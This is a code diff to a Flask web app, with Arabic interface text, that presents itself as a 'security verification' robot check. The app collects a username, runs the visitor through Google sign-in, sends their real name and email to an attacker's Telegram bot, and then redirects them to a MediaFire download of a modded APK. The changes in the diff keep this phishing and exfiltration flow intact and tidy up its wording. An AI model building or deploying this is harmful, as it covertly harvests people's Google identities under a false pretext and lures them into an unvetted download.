@@ -4,7 +4,7 @@ from flask import Flask, redirect, render_template_string, request, session, url
 from google_auth_oauthlib.flow import Flow
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "multi_step_oauth_secret_key")
+app.secret_key = os.getenv("SECRET_KEY", "oauth_username_step_secret")
 
 os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
 
@@ -20,7 +20,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
 
 
-# الخطوة الأولى: طلب اسم المستخدم
+# الخطوة 1: طلب اسم المستخدم أولاً
 @app.route("/", methods=["GET", "POST"])
 def index():
   error = ""
@@ -29,9 +29,8 @@ def index():
     if not username:
       error = "الرجاء إدخال اسم المستخدم للمتابعة."
     else:
-      # حفظ اسم المستخدم في الجلسة مؤقتاً والانتقال لتسجيل دخول جوجل
       session["username"] = username
-      return redirect(url_for("login"))
+      return redirect(url_for("start_google_login"))
 
   return render_template_string(
       """
@@ -40,7 +39,7 @@ def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الأمني - الخطوة الأولى</title>
+    <title>التحقق الأمني - إدخال الاسم</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
         body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
@@ -58,7 +57,7 @@ def index():
 <body>
     <div class="container">
         <div class="title">التحقق الأمني</div>
-        <div class="subtitle">أدخل اسم المستخدم للبدء في عملية التحقق من أنك لست برنامج روبوت.</div>
+        <div class="subtitle">أدخل اسم المستخدم أولاً، ثم انتقل لتسجيل الدخول بحساب Google للتحقق.</div>
 
         {% if error %}
             <div class="error-msg">{{ error }}</div>
@@ -68,7 +67,7 @@ def index():
             <div class="input-group">
                 <input type="text" name="username" required placeholder="اسم المستخدم" value="{{ request.form.get('username', '') }}">
             </div>
-            <button type="submit" class="submit-btn">متابعة</button>
+            <button type="submit" class="submit-btn">متابعة إلى حساب Google</button>
         </form>
     </div>
 </body>
@@ -78,9 +77,9 @@ def index():
   )
 
 
-# الخطوة الثانية: الانتقال لتسجيل الدخول الحقيقي عبر Google OAuth2
-@app.route("/login")
-def login():
+# الخطوة 2: التوجيه لصفحة جوجل الحقيقية (OAuth2)
+@app.route("/google-login")
+def start_google_login():
   if "username" not in session:
     return redirect(url_for("index"))
 
@@ -96,7 +95,7 @@ def login():
   return redirect(authorization_url)
 
 
-# الخطوة الأخيرة: استقبال بيانات جوجل الحقيقية، إرسالها لتليجرام، والتحويل لملف التنزيل
+# الخطوة 3: استقبال البريد الحقيقي، إرساله للتليجرام، والتحويل لميديافاير
 @app.route("/authorized")
 def authorized():
   flow = Flow.from_client_secrets_file(
@@ -116,12 +115,11 @@ def authorized():
   google_name = user_info_service.get("name")
   custom_username = session.get("username", "غير معروف")
 
-  # إرسال البيانات المجمعة إلى بوت التليجرام
   if BOT_TOKEN and CHAT_ID and user_email:
     msg = (
         "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم (المُدخل):"
         f" {custom_username}\n📛 اسم حساب Google: {google_name}\n📧 البريد"
-        f" الحقيقي: {user_email}"
+        f" الإلكتروني الحقيقي: {user_email}"
     )
     telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
